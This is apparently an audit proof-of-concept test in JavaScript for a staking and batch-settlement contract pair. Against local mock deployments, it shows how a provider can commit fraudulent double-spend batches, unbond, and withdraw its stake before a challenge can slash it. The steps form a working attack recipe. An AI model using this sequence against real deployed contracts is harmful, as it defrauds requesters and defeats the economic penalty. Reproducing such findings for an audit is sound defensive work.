const { expect } = require("chai");
const { ethers } = require("hardhat");
const { time } = require("@nomicfoundation/hardhat-network-helpers");

// Team A — Economic Audit
//
// Finding A-02 PoC: stake-bond UNBOND-vs-CHALLENGE race.
//
// The contract pair (BatchSettlementRegistry + StakeBond) has no on-chain
// constraint linking unbondDelaySeconds >= challengeWindowSeconds.
// MIN_UNBOND_DELAY_SECONDS = 1 day. challengeWindow MIN = 1 hour, default
// 3 days, MAX 30 days. If governance ever sets unbondDelay shorter than
// challengeWindow (or simply leaves both at independent defaults that
// happen to satisfy unbondDelay < challengeWindow), a malicious provider
// can:
//   1. commitBatch with fraudulent receipts at T=0
//   2. requestUnbond at T=0
//   3. withdraw stake at T = unbondDelay (state -> WITHDRAWN, amount = 0)
//   4. challenger discovers fraud at T < challengeWindow
//   5. challengeReceipt invalidates receipt but slash() reverts
//      NotSlashable (status == WITHDRAWN); reverts swallowed by try/catch.
//   6. provider keeps full stake, batch is invalidated (no payment) but
//      provider was never going to get paid for fraud anyway — the
//      ECONOMIC PENALTY (slash) is lost.
//
// Net: the slashing-during-UNBONDING defense (StakeBond.sol:338) only
// closes the race if unbondDelay >= challengeWindow. The contracts do
// NOT enforce that relationship, and the parameter ranges allow
// misconfiguration.

describe("AUDIT-TEAM-A — A02 Unbond/Challenge race lets attacker dodge slash", function () {
  let registry, escrowPool, token, stakeBond;
  let owner, attacker, requester, challenger, foundation;
  const ONE_FTNS = ethers.parseUnits("1", 18);
  const PREMIUM_STAKE = 25_000n * ONE_FTNS;
  const PREMIUM_SLASH_BPS = 10000; // 100%

  // === MISCONFIGURATION SCENARIO ===
  // unbondDelay = 1 day (the MIN allowed by StakeBond)
  // challengeWindow = 7 days (a perfectly reasonable governance choice)
  const UNBOND_DELAY = 1 * 24 * 60 * 60;     // 1 day
  const CHALLENGE_WINDOW = 7 * 24 * 60 * 60; // 7 days

  function makeLeaf(overrides = {}) {
    return {
      jobIdHash: ethers.keccak256(ethers.toUtf8Bytes("job-attacker")),
      shardIndex: 0,
      providerIdHash: ethers.keccak256(ethers.toUtf8Bytes("attacker-pid")),
      providerPubkeyHash: ethers.keccak256(ethers.toUtf8Bytes("pubkey")),
      outputHash: ethers.keccak256(ethers.toUtf8Bytes("malicious-output")),
      executedAtUnix: Math.floor(Date.now() / 1000),
      valueFtns: ONE_FTNS,
      signatureHash: ethers.keccak256(ethers.toUtf8Bytes("sig")),
      signingMessageHash: ethers.keccak256(ethers.toUtf8Bytes("signing-msg")),
      ...overrides,
    };
  }

  function hashLeaf(leaf) {
    const encoded = ethers.AbiCoder.defaultAbiCoder().encode(
      ["tuple(bytes32,uint32,bytes32,bytes32,bytes32,uint64,uint128,bytes32,bytes32)"],
      [[
        leaf.jobIdHash, leaf.shardIndex, leaf.providerIdHash,
        leaf.providerPubkeyHash, leaf.outputHash, leaf.executedAtUnix,
        leaf.valueFtns, leaf.signatureHash, leaf.signingMessageHash,
      ]],
    );
    return ethers.keccak256(encoded);
  }

  beforeEach(async function () {
    [owner, attacker, requester, challenger, foundation] = await ethers.getSigners();

    const Token = await ethers.getContractFactory("MockERC20");
    token = await Token.deploy();
    await token.waitForDeployment();

    const Pool = await ethers.getContractFactory("EscrowPool");
    escrowPool = await Pool.deploy(owner.address, await token.getAddress(), ethers.ZeroAddress);
    await escrowPool.waitForDeployment();

    const Registry = await ethers.getContractFactory("BatchSettlementRegistry");
    registry = await Registry.deploy(owner.address, CHALLENGE_WINDOW);
    await registry.waitForDeployment();

    await escrowPool.connect(owner).setSettlementRegistry(await registry.getAddress());
    await registry.connect(owner).setEscrowPool(await escrowPool.getAddress());

    const Bond = await ethers.getContractFactory("StakeBond");
    stakeBond = await Bond.deploy(owner.address, await token.getAddress(), UNBOND_DELAY);
    await stakeBond.waitForDeployment();

    await stakeBond.connect(owner).setSlasher(await registry.getAddress());
    await stakeBond.connect(owner).setFoundationReserveWallet(foundation.address);
    await registry.connect(owner).setStakeBond(await stakeBond.getAddress());

    await token.mint(requester.address, ONE_FTNS * 1000n);
    await token.connect(requester).approve(await escrowPool.getAddress(), ONE_FTNS * 1000n);
    await escrowPool.connect(requester).deposit(ONE_FTNS * 1000n);

    await token.mint(attacker.address, PREMIUM_STAKE * 2n);
    await token.connect(attacker).approve(await stakeBond.getAddress(), PREMIUM_STAKE * 2n);
    await stakeBond.connect(attacker).bond(PREMIUM_STAKE, PREMIUM_SLASH_BPS);
  });

  it("attacker withdraws stake before challenge, escapes slashing", async function () {
    // Stash the attacker's pre-attack balance (after bonding the
    // PREMIUM_STAKE, the wallet still holds PREMIUM_STAKE * 2 - PREMIUM_STAKE
    // = PREMIUM_STAKE in liquid form).
    const beforeBal = await token.balanceOf(attacker.address);

    // ---- Step 1: commit a fraudulent batch with one bogus receipt.
    // We will use DOUBLE_SPEND as the challenge vector. To make
    // DOUBLE_SPEND provable later, we commit the same leaf TWICE
    // in two separate batches, both attacker-signed.
    const leaf = makeLeaf();
    const root = hashLeaf(leaf);

    const tx1 = await registry.connect(attacker).commitBatch(
      requester.address, root, 1, leaf.valueFtns, PREMIUM_SLASH_BPS, ethers.ZeroHash, "b1"
    );
    const r1 = await tx1.wait();
    const batchId1 = r1.logs.find(l => l.fragment && l.fragment.name === "BatchCommitted").args[0];

    const tx2 = await registry.connect(attacker).commitBatch(
      requester.address, root, 1, leaf.valueFtns, PREMIUM_SLASH_BPS, ethers.ZeroHash, "b2"
    );
    const r2 = await tx2.wait();
    const batchId2 = r2.logs.find(l => l.fragment && l.fragment.name === "BatchCommitted").args[0];

    // ---- Step 2: at T=0, also requestUnbond. This is the load-bearing
    // attack move: kick off the unbond timer the same block that
    // commitBatch lands.
    await stakeBond.connect(attacker).requestUnbond();

    // ---- Step 3: wait UNBOND_DELAY (1 day), then withdraw stake.
    await time.increase(UNBOND_DELAY + 1);
    await stakeBond.connect(attacker).withdraw();

    // Attacker now holds the entire stake back in their wallet.
    const afterWithdraw = await token.balanceOf(attacker.address);
    expect(afterWithdraw - beforeBal).to.equal(PREMIUM_STAKE); // stake fully returned

    // Verify state: stake is WITHDRAWN, amount is 0.
    const stake = await stakeBond.stakes(attacker.address);
    expect(stake.status).to.equal(3); // WITHDRAWN
    expect(stake.amount).to.equal(0n);

    // ---- Step 4: at T = UNBOND_DELAY + 1 < CHALLENGE_WINDOW, the
    // challenger now discovers and challenges. We're still inside
    // the 7-day challenge window.
    const leafHash = hashLeaf(leaf);
    const auxData = ethers.AbiCoder.defaultAbiCoder().encode(
      ["bytes32", "bytes32[]"],
      [batchId2, []]  // empty proof works for single-leaf root
    );

    // Capture foundation reserve before the challenge.
    const reserveBefore = await stakeBond.foundationReserveBalance();
    const bountyBefore = await stakeBond.slashedBountyPayable(challenger.address);

    // The challenge succeeds (receipt invalidated) but slash silently
    // reverts inside the try/catch — provider lost no stake.
    await expect(
      registry.connect(challenger).challengeReceipt(
        batchId1, leaf, [], 0, auxData  // 0 = DOUBLE_SPEND
      )
    ).to.emit(registry, "ReceiptChallenged");

    // ---- Step 5: assert the slashing was a no-op (the heart of the bug).
    const reserveAfter = await stakeBond.foundationReserveBalance();
    const bountyAfter = await stakeBond.slashedBountyPayable(challenger.address);

    expect(reserveAfter).to.equal(reserveBefore);
    expect(bountyAfter).to.equal(bountyBefore);

    // The attacker walked away with their stake intact even after a
    // confirmed DOUBLE_SPEND challenge. This is the broken invariant.
    const stakeFinal = await stakeBond.stakes(attacker.address);
    expect(stakeFinal.amount).to.equal(0n); // already drained pre-challenge
  });
});
